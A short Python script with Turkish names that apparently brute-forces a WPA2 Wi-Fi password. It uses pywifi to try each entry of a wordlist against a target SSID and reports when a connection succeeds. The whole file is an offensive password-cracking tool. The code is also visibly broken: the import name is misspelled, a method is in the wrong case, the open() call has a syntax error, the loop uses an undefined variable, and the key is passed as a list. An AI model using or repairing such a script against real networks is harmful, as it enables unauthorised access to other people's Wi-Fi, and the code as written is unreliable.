#------------------------------Kütüphaneler-------------------------------------------
import time
from pywifi import PyWİFİ
from pywifi import const
from pywifi import Profile
#-------------------------------------------------------------------------------------

ssid = "bugra"
dosya_yolu = "C:\Users\bugra\Desktop\wifi-shack\sifre.txt"

try:
    wifi = PyWİFİ()
    iface = wifi.interFaces()[0]
    
    iface.scan()
    sunuc = iface.scan_results()
    
except:
    print("!!HATA!!")
    
def sifredene(ssid,dosya_yolu):
    count = 0
    with open (dosya_yolu 'r', encoding='utf8') as words:
        for kelime in kelimeler:
            count +=1
            kelime = kelime.split('\n')
            sifre = kelime
            main(ssid,sifre,count)
            

def main(ssid,sifre,count):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher=const.CIPHER_TYPE_CCMP
    
    profile.key=sifre
    
    iface.remove_all_network_profiles()
    connect = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(connect)
    time.sleep(0.5)
    
    if iface.status() == const.IFACE_CONNECTED:
        print('SİFRE BULUNDU '+sifre)
    else:
        print(f'[{count}] sifre denendi ama bulunamadı {sifre}')
sifredene(ssid,dosya_yolu)